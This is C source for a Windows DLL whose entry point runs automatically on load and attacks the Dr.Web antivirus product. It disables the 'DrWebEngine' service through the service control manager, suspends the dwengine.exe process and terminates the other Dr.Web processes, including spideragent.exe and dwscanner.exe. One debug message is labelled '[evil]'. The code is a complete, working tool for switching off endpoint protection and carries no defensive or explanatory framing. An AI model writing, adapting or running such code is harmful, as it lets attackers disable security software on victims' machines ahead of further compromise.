#include <windows.h>
#include <TlHelp32.h>
#include "ntdll\ntdll.h"
#include "ntdll\winnative.h"
#include "rtls\prtl.h"

#pragma warning(disable:4100) // warning C4100: unreferenced formal parameter

#define ProcessesCount 6
LPTSTR Processes[ProcessesCount] = {
	TEXT("dwengine.exe"), 
	TEXT("dwarkdaemon.exe"),
	TEXT("spideragent.exe"),
	TEXT("dwscanner.exe"),
	TEXT("dwnetfilter.exe"),
	TEXT("spideragent_adm.exe")
};

BOOL IsInList(
	LPTSTR szProcessName
	)
{
	INT i;

	for (i = 0; i < ProcessesCount; i++) {

		if (lstrcmpi(Processes[i], szProcessName) == 0)
			return TRUE;

	}
	return FALSE;
}

BOOL ListProcesses()
{
	PROCESSENTRY32 Entry;
	HANDLE ShotHandle;
	HANDLE hProcess;
	BOOL IsDwService = FALSE;
	BOOL result = FALSE;

	Entry.dwSize = sizeof(PROCESSENTRY32);

	ShotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if ( ShotHandle != INVALID_HANDLE_VALUE ) {
		if (Process32First(ShotHandle, &Entry)) {
			do {
				if ( IsInList(Entry.szExeFile) ) {

					if (lstrcmpi(Entry.szExeFile, TEXT("dwengine.exe")) == 0) 
						IsDwService = TRUE;
					else
						IsDwService = FALSE;

					hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Entry.th32ProcessID);
					if (hProcess) {

						if (IsDwService == TRUE) {
							NtSuspendProcess(hProcess);
						} else {
							NtTerminateProcess(hProcess, 0);
						}
						CloseHandle(hProcess);
						result = TRUE;

					} else {

						OutputDebugString(TEXT("[evil] OpenProcess fail"));
					}

				}
			} while (Process32Next(ShotHandle, &Entry));
		}
		CloseHandle(ShotHandle);
	}
	return result;
}

VOID StopDrWebService(
	)
{
	SC_HANDLE hService;
	SC_HANDLE hScm;
	SERVICE_STATUS ServiceStatus;

	hScm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hScm == NULL)
		return;
	
	hService = OpenService(hScm, TEXT("DrWebEngine"), SERVICE_ALL_ACCESS);
	if (hService == NULL) {
		OutputDebugString(TEXT("OpenService fail"));
		return;
	}

	if (!ChangeServiceConfig(hService, SERVICE_WIN32_OWN_PROCESS, SERVICE_DISABLED, SERVICE_ERROR_NORMAL, 
		NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
		OutputDebugString(TEXT("ChangeServiceConfig fail"));
		return;
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(hScm);

}

BOOL WINAPI DllMain(
  __in  HINSTANCE hinstDLL,
  __in  DWORD fdwReason,
  __in  LPVOID lpvReserved
)
{
	DisableThreadLibraryCalls(hinstDLL);
	StopDrWebService();
	ListProcesses();

	return TRUE;
}